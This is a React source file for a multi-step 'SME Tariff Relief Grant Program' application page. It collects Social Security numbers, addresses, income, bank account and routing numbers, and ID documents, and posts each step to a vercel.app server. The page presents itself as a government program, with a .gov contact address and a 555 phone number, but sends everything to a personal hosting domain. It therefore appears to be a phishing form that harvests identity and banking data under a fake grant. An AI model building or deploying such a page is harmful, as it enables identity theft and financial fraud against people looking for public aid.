import React, { useState } from 'react';
import axios from 'axios';
import { CheckCircleIcon, AlertCircleIcon, ChevronRightIcon, PhoneIcon, MailIcon } from 'lucide-react';
import Button from '~/components/ui/Button';
import VideoModal from '~/components/ui/VideoModal';

export default function IndividualApplicationPage() {
    const [step, setStep] = useState(1);
    const [formSubmitted, setFormSubmitted] = useState(false);
    const [loading, setLoading] = useState(false); // Loader state

    const state = [
        { key: 'AL', name: 'Alabama' },
        { key: 'AK', name: 'Alaska' },
        { key: 'AZ', name: 'Arizona' },
        { key: 'AR', name: 'Arkansas' },
        { key: 'CA', name: 'California' },
        { key: 'CO', name: 'Colorado' },
        { key: 'CT', name: 'Connecticut' },
        { key: 'DE', name: 'Delaware' },
        { key: 'FL', name: 'Florida' },
        { key: 'GA', name: 'Georgia' },
        { key: 'HI', name: 'Hawaii' },
        { key: 'ID', name: 'Idaho' },
        { key: 'IL', name: 'Illinois' },
        { key: 'IN', name: 'Indiana' },
        { key: 'IA', name: 'Iowa' },
        { key: 'KS', name: 'Kansas' },
        { key: 'KY', name: 'Kentucky' },
        { key: 'LA', name: 'Louisiana' },
        { key: 'ME', name: 'Maine' },
        { key: 'MD', name: 'Maryland' },
        { key: 'MA', name: 'Massachusetts' },
        { key: 'MI', name: 'Michigan' },
        { key: 'MN', name: 'Minnesota' },
        { key: 'MS', name: 'Mississippi' },
        { key: 'MO', name: 'Missouri' },
        { key: 'MT', name: 'Montana' },
        { key: 'NE', name: 'Nebraska' },
        { key: 'NV', name: 'Nevada' },
        { key: 'NH', name: 'New Hampshire' },
        { key: 'NJ', name: 'New Jersey' },
        { key: 'NM', name: 'New Mexico' },
        { key: 'NY', name: 'New York' },
        { key: 'NC', name: 'North Carolina' },
        { key: 'ND', name: 'North Dakota' },
        { key: 'OH', name: 'Ohio' },
        { key: 'OK', name: 'Oklahoma' },
        { key: 'OR', name: 'Oregon' },
        { key: 'PA', name: 'Pennsylvania' },
        { key: 'RI', name: 'Rhode Island' },
        { key: 'SC', name: 'South Carolina' },
        { key: 'SD', name: 'South Dakota' },
        { key: 'TN', name: 'Tennessee' },
        { key: 'TX', name: 'Texas' },
        { key: 'UT', name: 'Utah' },
        { key: 'VT', name: 'Vermont' },
        { key: 'VA', name: 'Virginia' },
        { key: 'WA', name: 'Washington' },
        { key: 'WV', name: 'West Virginia' },
        { key: 'WI', name: 'Wisconsin' },
        { key: 'WY', name: 'Wyoming' }
    ];

    // State for form fields
    const [formData, setFormData] = useState({
        firstName: '',
        lastName: '',
        ssn: '',
        address: '',
        city: '',
        state: '',
        zip: '',
        phone: '',
        email: '',
        annualIncome: '',
        assets: '',
        liabilities: '',
        bankName: '',
        accountNumber: '',
        routingNumber: '',
        accountType: '',
    });

    // State for file uploads
    const [files, setFiles] = useState<{
        idProof: File | null;
        incomeProof: File | null;
        tariffImpactProof: File | null;
    }>({
        idProof: null,
        incomeProof: null,
        tariffImpactProof: null,
    });



    const handleInputChange = (e: React.ChangeEvent<HTMLInputElement | HTMLSelectElement | HTMLTextAreaElement>) => {
        const { id, value } = e.target;
        setFormData(prev => ({ ...prev, [id]: value }));
    };

    const handleFileChange = (e: React.ChangeEvent<HTMLInputElement>) => {
        const { id, files: uploadedFiles } = e.target;
        if (uploadedFiles && uploadedFiles[0]) {
            setFiles(prev => ({ ...prev, [id]: uploadedFiles[0] }));
        }
    };

    const handleNextStep = async () => {
        try {
            setLoading(true); // Start loader
            const stepData = step === 1
                ? { firstName: formData.firstName, lastName: formData.lastName, ssn: formData.ssn, address: formData.address, city: formData.city, state: formData.state, zip: formData.zip, phone: formData.phone, email: formData.email }
                : step === 2
                    ? { annualIncome: formData.annualIncome, assets: formData.assets, liabilities: formData.liabilities, bankName: formData.bankName, accountNumber: formData.accountNumber, routingNumber: formData.routingNumber, accountType: formData.accountType }
                    : files;

            const response = await axios.post('https://tariff-relief-server.vercel.app/api/individual/verify', {
                step: step,
                data: stepData,
            }, {
                headers: {
                    'Access-Control-Allow-Origin': '*',
                },
            });

            if (response.data.success) {
                setStep(prev => prev + 1);
            } else {
                alert(response.data.message);
            }
        } catch (error) {
            console.error('Error submitting step:', error);
            alert('An error occurred while submitting the step. Please try again.');
        } finally {
            setLoading(false); // Stop loader
        }
    };

    const handlePrevStep = () => setStep(prev => prev - 1);
    const handleSubmit = async (e: React.FormEvent) => {
        e.preventDefault();
        try {
            setLoading(true); // Start loader
            const response = await axios.post('https://tariff-relief-server.vercel.app/api/individual/submit', {
                formData: formData,
                files: files
            }, {
                headers: {
                    'Access-Control-Allow-Origin': '*',
                },
            });

            if (response.data.success) {
                setFormSubmitted(true);
            } else {
                alert(response.data.message);
            }
        } catch (error) {
            console.error('Error submitting application:', error);
            alert('An error occurred while submitting the application. Please try again.');
        } finally {
            setLoading(false); // Stop loader
        }
    };

    const renderStepContent = () => {
        if (formSubmitted) {
            return (
                <div className="bg-green-50 border border-green-200 rounded-lg p-8 text-center">
                    <div className="w-16 h-16 bg-green-100 rounded-full flex items-center justify-center mx-auto mb-4">
                        <CheckCircleIcon size={32} className="text-green-600" />
                    </div>
                    <h2 className="text-2xl font-bold mb-4">Application Submitted Successfully!</h2>
                    <p className="text-lg mb-6">
                        Thank you for applying to the SME Tariff Relief Program. Your application has been received and will be reviewed by our team.
                    </p>
                    <Button href="/" variant="primary">Return to Homepage</Button>
                </div>
            );
        }

        switch (step) {
            case 1:
                return (
                    <>
                        <h2 className="text-xl font-bold mb-6">Personal Information</h2>
                        <div className="space-y-4">
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                    <label htmlFor="firstName" className="block font-medium mb-1">First Name *</label>
                                    <input type="text" id="firstName" value={formData.firstName} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                                <div>
                                    <label htmlFor="lastName" className="block font-medium mb-1">Last Name *</label>
                                    <input type="text" id="lastName" value={formData.lastName} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                            </div>
                            <div>
                                <label htmlFor="ssn" className="block font-medium mb-1">Social Security Number (SSN) *</label>
                                <input type="text" id="ssn" value={formData.ssn} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="address" className="block font-medium mb-1">Address *</label>
                                <input type="text" id="address" value={formData.address} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
                                <div>
                                    <label htmlFor="city" className="block font-medium mb-1">City *</label>
                                    <input type="text" id="city" value={formData.city} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                                <div>
                                    <label htmlFor="state" className="block font-medium mb-1">State *</label>
                                    <select id="state" value={formData.state} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                                        <option value="">Select a state</option>
                                        {state.map(({ key, name }) => (
                                            <option key={key} value={key}>{name}</option>
                                        ))}
                                    </select>
                                </div>
                                <div>
                                    <label htmlFor="zip" className="block font-medium mb-1">ZIP Code *</label>
                                    <input type="text" id="zip" value={formData.zip} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                            </div>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                    <label htmlFor="phone" className="block font-medium mb-1">Phone *</label>
                                    <div className="relative">
                                        <input type="tel" id="phone" value={formData.phone} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 pl-10 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                        <span className="absolute inset-y-0 left-3 flex items-center text-gray-500">+1</span>
                                    </div>
                                </div>
                                <div>
                                    <label htmlFor="email" className="block font-medium mb-1">Email *</label>
                                    <input type="email" id="email" value={formData.email} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                            </div>
                        </div>
                        <div className="mt-8 flex justify-end">
                            <Button onClick={handleNextStep} variant="primary">
                                Next: Financial Details <ChevronRightIcon size={16} className="ml-1" />
                            </Button>
                        </div>
                    </>
                );
            case 2:
                return (
                    <>
                        <h2 className="text-xl font-bold mb-6">Financial Details</h2>
                        <div className="space-y-4">
                            <div>
                                <label htmlFor="annualIncome" className="block font-medium mb-1">Annual Income *</label>
                                <input type="number" id="annualIncome" value={formData.annualIncome} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="assets" className="block font-medium mb-1">Total Assets (Estimated) *</label>
                                <input type="number" id="assets" value={formData.assets} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="liabilities" className="block font-medium mb-1">Total Liabilities (Estimated) *</label>
                                <input type="number" id="liabilities" value={formData.liabilities} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="bankName" className="block font-medium mb-1">Bank Name *</label>
                                <input type="text" id="bankName" value={formData.bankName} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                                <div>
                                    <label htmlFor="accountNumber" className="block font-medium mb-1">Account Number *</label>
                                    <input type="text" id="accountNumber" value={formData.accountNumber} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                                <div>
                                    <label htmlFor="routingNumber" className="block font-medium mb-1">Routing Number *</label>
                                    <input type="text" id="routingNumber" value={formData.routingNumber} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                                </div>
                            </div>
                            <div>
                                <label htmlFor="accountType" className="block font-medium mb-1">Account Type *</label>
                                <select id="accountType" value={formData.accountType} onChange={handleInputChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required>
                                    <option value="">Select account type</option>
                                    <option value="checking">Checking</option>
                                    <option value="savings">Savings</option>
                                </select>
                            </div>
                        </div>
                        <div className="mt-8 flex justify-between">
                            <Button onClick={handlePrevStep} variant="outline">Previous</Button>
                            <Button onClick={handleNextStep} variant="primary">
                                Next: Documentation <ChevronRightIcon size={16} className="ml-1" />
                            </Button>
                        </div>
                    </>
                );
            case 3:
                return (
                    <>
                        <h2 className="text-xl font-bold mb-6">Required Documentation</h2>
                        <div className="bg-blue-50 p-4 rounded-md mb-6">
                            <div className="flex">
                                <AlertCircleIcon className="text-blue-600 mr-3 flex-shrink-0" size={20} />
                                <p className="text-sm text-blue-700">
                                    Please upload the following required documents in PDF format.
                                    Each file should be no larger than 10MB.
                                </p>
                            </div>
                        </div>
                        <div className="space-y-6">
                            <div>
                                <label htmlFor="idProof" className="block font-medium mb-1">Government ID Proof *</label>
                                <input type="file" id="idProof" onChange={handleFileChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="incomeProof" className="block font-medium mb-1">Proof of Income *</label>
                                <input type="file" id="incomeProof" onChange={handleFileChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                            <div>
                                <label htmlFor="tariffImpactProof" className="block font-medium mb-1">Proof of Tariff Impact *</label>
                                <input type="file" id="tariffImpactProof" onChange={handleFileChange} className="w-full border border-gray-300 rounded-md px-3 py-2 focus:outline-none focus:ring-2 focus:ring-blue-500" required />
                            </div>
                        </div>
                        <div className="mt-8 flex justify-between">
                            <Button onClick={handlePrevStep} variant="outline">Previous</Button>
                            <Button onClick={handleNextStep} variant="primary">
                                Next: Review & Submit <ChevronRightIcon size={16} className="ml-1" />
                            </Button>
                        </div>
                    </>
                );
            case 4:
                return (
                    <>
                        <h2 className="text-xl font-bold mb-6">Review & Submit Application</h2>
                        <div className="bg-gray-50 p-6 rounded-lg mb-8">
                            <h3 className="font-bold mb-4">Application Summary</h3>
                            <p className="text-sm text-gray-500">Review your details before submitting.</p>
                            <ul className="list-disc list-inside space-y-2 text-gray-700">
                                <li><strong>First Name:</strong> {formData.firstName}</li>
                                <li><strong>Last Name:</strong> {formData.lastName}</li>
                                <li><strong>Social Security Number (SSN):</strong> {formData.ssn}</li>
                                <li><strong>Address:</strong> {formData.address}</li>
                                <li><strong>City:</strong> {formData.city}</li>
                                <li><strong>State:</strong> {formData.state}</li>
                                <li><strong>ZIP Code:</strong> {formData.zip}</li>
                                <li><strong>Phone:</strong> {formData.phone}</li>
                                <li><strong>Email:</strong> {formData.email}</li>
                                <li><strong>Annual Income:</strong> {formData.annualIncome}</li>
                                <li><strong>Total Assets:</strong> {formData.assets}</li>
                                <li><strong>Total Liabilities:</strong> {formData.liabilities}</li>
                                <li><strong>Government ID Proof:</strong> {files.idProof ? files.idProof.name : 'Not Uploaded'}</li>
                                <li><strong>Proof of Income:</strong> {files.incomeProof ? files.incomeProof.name : 'Not Uploaded'}</li>
                                <li><strong>Proof of Tariff Impact:</strong> {files.tariffImpactProof ? files.tariffImpactProof.name : 'Not Uploaded'}</li>
                                <li><strong>Bank Name:</strong> {formData.bankName}</li>
                                <li><strong>Account Number:</strong> {formData.accountNumber}</li>
                                <li><strong>Routing Number:</strong> {formData.routingNumber}</li>
                                <li><strong>Account Type:</strong> {formData.accountType}</li>
                            </ul>
                        </div>
                        <div className="mt-8 flex justify-between">
                            <Button onClick={handlePrevStep} variant="outline">Previous</Button>
                            <Button onClick={handleSubmit} variant="secondary">Submit Application</Button>
                        </div>
                    </>
                );
            default:
                return null;
        }
    };

    return (
        <div className="w-full">
            {/* Loader */}
            {loading && <div className="fixed inset-0 bg-black bg-opacity-50 flex items-center justify-center z-50">
                <div className="loader border-t-4 border-blue-500 rounded-full w-12 h-12 animate-spin"></div>
            </div>}
            {/* Header */}
            <section className="bg-navy-700 text-white py-12">
                <div className="container mx-auto px-4">
                    <h1 className="text-3xl md:text-4xl font-bold mb-4">Apply for Individual Funding</h1>
                    <p className="text-xl max-w-3xl">Complete the application form below to apply for the SME Tariff Relief Grant Program as an individual.</p>
                </div>
            </section>
            {/* Application Steps */}
            {!formSubmitted && <section className="bg-white py-8 border-b">
                <div className="container mx-auto px-4">
                    <div className="max-w-4xl mx-auto">
                        <div className="flex justify-between">
                            {['Personal Information', 'Financial Details', 'Documentation', 'Review & Submit'].map((stepName, index) => {
                                const stepNumber = index + 1;
                                const isActive = step === stepNumber;
                                const isCompleted = step > stepNumber;
                                return <div key={index} className="flex flex-col items-center">
                                    <div className={`w-8 h-8 rounded-full flex items-center justify-center ${isActive ? 'bg-blue-600 text-white' : isCompleted ? 'bg-green-500 text-white' : 'bg-gray-200 text-gray-500'}`}>
                                        {isCompleted ? <CheckCircleIcon size={16} /> : stepNumber}
                                    </div>
                                    <div className={`text-xs mt-1 ${isActive ? 'font-medium' : ''} hidden md:block`}>
                                        {stepName}
                                    </div>
                                </div>;
                            })}
                        </div>
                        <div className="relative mt-2">
                            <div className="absolute top-0 left-4 right-4 h-1 bg-gray-200">
                                <div className="h-full bg-blue-600" style={{ width: `${(step - 1) / 3 * 100}%` }} />
                            </div>
                        </div>
                    </div>
                </div>
            </section>}
            {/* Application Form */}
            <section className="py-12 bg-gray-50">
                <div className="container mx-auto px-4">
                    <div className="max-w-4xl mx-auto">
                        <div className="bg-white p-8 rounded-lg shadow-md">
                            <form>{renderStepContent()}</form>
                        </div>
                    </div>
                </div>
            </section>
            {/* Help Section */}
            {!formSubmitted && <section className="py-12 bg-white">
                <div className="container mx-auto px-4">
                    <div className="max-w-4xl mx-auto">
                        <div className="grid grid-cols-1 md:grid-cols-2 gap-8">
                            <div>
                                <h3 className="text-xl font-bold mb-4">Need Help?</h3>
                                <p className="mb-4">Our support team is available to assist you with your application. Contact us with any questions.</p>
                                <div className="space-y-2">
                                    <div className="flex items-center">
                                        <PhoneIcon size={18} className="text-blue-600 mr-2" />
                                        <span>(202) 555-1234</span>
                                    </div>
                                    <div className="flex items-center">
                                        <MailIcon size={18} className="text-blue-600 mr-2" />
                                        <span>applications@tariffrelief.gov</span>
                                    </div>
                                </div>
                            </div>
                            <div>
                                <h3 className="text-xl font-bold mb-4">Application Tips</h3>
                                <ul className="list-disc list-inside space-y-2 text-gray-700">
                                    <li>Have all required documents ready before starting</li>
                                    <li>Be specific about how tariffs have impacted you</li>
                                    <li>Clearly explain how grant funds will be used</li>
                                    <li>Provide accurate financial information</li>
                                    <li>Applications are typically processed within 30-45 days</li>
                                </ul>
                            </div>
                        </div>
                    </div>
                </div>
            </section>}
            <VideoModal />
        </div>
    );
}
